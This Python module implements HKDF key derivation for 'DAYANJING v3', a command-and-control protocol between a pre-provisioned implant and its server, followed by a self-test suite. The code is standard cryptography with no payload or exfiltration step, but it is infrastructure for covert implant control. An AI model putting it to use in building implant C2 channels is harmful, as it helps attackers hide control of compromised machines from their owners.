"""
DAYANJING v3 — 密钥派生层
============================

实现 v3 设计文档 §4 的密钥派生链：
- 长期：PSK（implant 预置，服务端同值，≥128 bit 熵）
- 注册时：HKDF-Extract(salt=salt_reg_32B, ikm=PSK)
  → k_server_hold = Expand("implant-pair:server:v1", 16)
  → k_identity    = Expand("implant-pair:identity:v1", 16)  # 仅派生证明，永不加密
- 会话派生：handshake_hash = SHA256(HELLO || WELCOME || FINISHED_prefix)
  session_prk = HKDF-Extract(salt=handshake_hash, ikm=master)
  context = "dayanjing-c2/v1" || generation(8B) || server_static_id || implant_id
  k_send / k_recv = Expand("session:c2s:v1" / "session:s2c:v1" + context, 16)
  k_confirm = Expand("session:confirm:v1" + context, 16)

核心不变量：
- k_identity 与 k_server_hold 由独立 info 分别 Expand（H1 修正）
- salt 为 32B 独立随机值，PSK 放入 IKM（RFC 5869 §3.1 标准用法）
- 会话密钥与 transcript、双方身份、代际共同绑定（C1 修正）
- k_send ≠ k_recv 强制分离，单密钥退化路径已删除
"""

import hashlib
import os

from crypto_layer import hkdf_extract, hkdf_expand, hmac_sha256, sha256

HKDF_SALT_REG_LEN = 32

# 独立 info 标签（v1 修正：前后 16B 切分无分离证明）
INFO_SERVER_HOLD = b"implant-pair:server:v1"
INFO_IDENTITY = b"implant-pair:identity:v1"

INFO_SESSION_C2S = b"session:c2s:v1"
INFO_SESSION_S2C = b"session:s2c:v1"
INFO_SESSION_CONFIRM = b"session:confirm:v1"

PROTO_LABEL = b"dayanjing-c2/v1"


class KeyMaterial:
    """派生出的密钥材料容器。"""

    __slots__ = ("k_server_hold", "k_identity")

    def __init__(self, k_server_hold: bytes, k_identity: bytes):
        if len(k_server_hold) != 16 or len(k_identity) != 16:
            raise ValueError("keys must be 16 bytes")
        self.k_server_hold = k_server_hold
        self.k_identity = k_identity


def derive_pair(psk: bytes, salt_reg: bytes) -> KeyMaterial:
    """注册时派生 (k_server_hold, k_identity)。

    PRK = HKDF-Extract(salt=salt_reg, ikm=PSK)
    k_server_hold = Expand(PRK, "implant-pair:server:v1", 16)
    k_identity    = Expand(PRK, "implant-pair:identity:v1", 16)
    """
    if salt_reg is None or len(salt_reg) != HKDF_SALT_REG_LEN:
        raise ValueError(f"salt_reg must be {HKDF_SALT_REG_LEN} bytes")
    if len(psk) < 16:
        raise ValueError("PSK must be at least 16 bytes (128 bit entropy)")

    prk = hkdf_extract(salt_reg, psk)
    k_server_hold = hkdf_expand(prk, INFO_SERVER_HOLD, 16)
    k_identity = hkdf_expand(prk, INFO_IDENTITY, 16)
    return KeyMaterial(k_server_hold, k_identity)


def _build_context(server_static_id: bytes, implant_id: bytes, generation: int) -> bytes:
    """会话绑定上下文：协议标签 || 代际 || 服务端静态身份 || implant 身份。"""
    if len(server_static_id) != 16:
        raise ValueError("server_static_id must be 16 bytes")
    return (
        PROTO_LABEL
        + generation.to_bytes(8, "big")
        + server_static_id
        + implant_id.encode("utf-8")
    )


def derive_session(
    master: bytes,
    transcript_hash: bytes,
    server_static_id: bytes,
    implant_id: str,
    generation: int,
) -> tuple:
    """会话密钥派生。返回 (k_send, k_recv, k_confirm)。

    session_prk = HKDF-Extract(salt=transcript_hash, ikm=master)   # salt 不再为 NULL
    context = PROTO_LABEL || generation || server_static_id || implant_id
    k_c2s = Expand(session_prk, "session:c2s:v1" + context, 16)
    k_s2c = Expand(session_prk, "session:s2c:v1" + context, 16)
    k_confirm = Expand(session_prk, "session:confirm:v1" + context, 16)
    """
    if len(master) != 16:
        raise ValueError("master must be 16 bytes")
    if len(transcript_hash) != 32:
        raise ValueError("transcript_hash must be SHA-256 output (32 bytes)")

    session_prk = hkdf_extract(transcript_hash, master)  # salt = transcript_hash
    ctx = _build_context(server_static_id, implant_id, generation)

    k_c2s = hkdf_expand(session_prk, INFO_SESSION_C2S + ctx, 16)
    k_s2c = hkdf_expand(session_prk, INFO_SESSION_S2C + ctx, 16)
    k_confirm = hkdf_expand(session_prk, INFO_SESSION_CONFIRM + ctx, 16)

    # 强制 k_send ≠ k_recv（H8 修正：删除单密钥退化路径）
    if k_c2s == k_s2c:
        raise RuntimeError("session key collision: c2s == s2c")
    return k_c2s, k_s2c, k_confirm


def compute_transcript(hello_bytes: bytes, welcome_bytes: bytes, finished_prefix: bytes) -> bytes:
    """transcript = SHA256(HELLO || WELCOME || finished_prefix)。

    finished_prefix 包含 Finished 消息的协议字段（不含 HMAC 值本身），
    使 transcript 覆盖完整握手消息且避免定义循环。
    """
    return sha256(hello_bytes + welcome_bytes + finished_prefix)


def make_salt_reg() -> bytes:
    """生成 32B 注册盐，与 HMAC-SHA256 块长对齐。"""
    return os.urandom(HKDF_SALT_REG_LEN)


# ---------------------------------------------------------------------------
# 自测
# ---------------------------------------------------------------------------

def _selftest():
    failures = []
    total = 0

    def check(name, cond):
        nonlocal total
        total += 1
        if not cond:
            failures.append(name)

    # 1. 派生确定性：相同 PSK+salt 得到相同密钥
    psk = b"\x11" * 32
    salt = bytes(range(32))
    km1 = derive_pair(psk, salt)
    km2 = derive_pair(psk, salt)
    check("pair deterministic", km1.k_server_hold == km2.k_server_hold and km1.k_identity == km2.k_identity)

    # 2. 独立 info 分离：k_server_hold ≠ k_identity
    check("pair keys separated", km1.k_server_hold != km1.k_identity)

    # 3. 不同 salt 产生不同密钥（差分测试）
    salt2 = bytes(range(32, 64))
    km3 = derive_pair(psk, salt2)
    check("salt changes keys",
          km3.k_server_hold != km1.k_server_hold and km3.k_identity != km1.k_identity)

    # 4. 与标准库对照：HKDF-Extract 语义
    import hmac as _hmac
    expected_prk = _hmac.new(salt, psk, hashlib.sha256).digest()
    actual_prk = hkdf_extract(salt, psk)
    check("extract matches HMAC(salt, psk)", actual_prk == expected_prk)

    # 5. 会话派生：k_c2s ≠ k_s2c ≠ k_confirm
    master = b"\xaa" * 16
    th = b"\xbb" * 32
    ssid = b"\x01" * 16
    k_c2s, k_s2c, k_confirm = derive_session(master, th, ssid, "impl-001", 1)
    check("session c2s != s2c", k_c2s != k_s2c)
    check("session confirm distinct", k_confirm != k_c2s and k_confirm != k_s2c)

    # 6. transcript 变化导致密钥变化（transcript binding，C1 核心）
    th2 = b"\xcc" * 32
    k_c2s2, _, _ = derive_session(master, th2, ssid, "impl-001", 1)
    check("transcript binds keys", k_c2s != k_c2s2)

    # 7. generation 变化导致密钥变化
    k_c2s3, _, _ = derive_session(master, th, ssid, "impl-001", 2)
    check("generation binds keys", k_c2s != k_c2s3)

    # 8. implant_id 变化导致密钥变化
    k_c2s4, _, _ = derive_session(master, th, ssid, "impl-002", 1)
    check("implant_id binds keys", k_c2s != k_c2s4)

    # 9. server_static_id 变化导致密钥变化
    ssid2 = b"\x02" * 16
    k_c2s5, _, _ = derive_session(master, th, ssid2, "impl-001", 1)
    check("server_static_id binds keys", k_c2s != k_c2s5)

    # 10. transcript 确定性
    h = b"hello"; w = b"welcome"; fp = b"finished_prefix"
    check("transcript deterministic", compute_transcript(h, w, fp) == compute_transcript(h, w, fp))

    # 11. transcript 覆盖完整握手（任一字节变化即变）
    t1 = compute_transcript(h, w, fp)
    t2 = compute_transcript(b"HELLO", w, fp)
    t3 = compute_transcript(h, b"WELCOME", fp)
    t4 = compute_transcript(h, w, b"FINISHED_PREFIX")
    check("transcript covers hello", t1 != t2)
    check("transcript covers welcome", t1 != t3)
    check("transcript covers finished_prefix", t1 != t4)

    # 12. 参数校验
    try:
        derive_pair(b"\x11" * 8, salt)  # PSK 太短
        failures.append("PSK length check")
    except ValueError:
        total += 1
    else:
        total += 1

    try:
        derive_pair(psk, b"\x00" * 16)  # salt 长度错误
        failures.append("salt length check")
    except ValueError:
        total += 1
    else:
        total += 1

    # 13. k_identity 不进入加密路径：仅做 HMAC 派生证明，不做密钥用途断言
    # （运行时无法强制，此处记录不变量测试）
    check("k_identity is 16 bytes", len(km1.k_identity) == 16)

    passed = total - len(failures)
    print(f"[key_derivation] {passed}/{total} tests passed")
    if failures:
        print("  FAIL:", failures)
        raise SystemExit(1)


if __name__ == "__main__":
    _selftest()
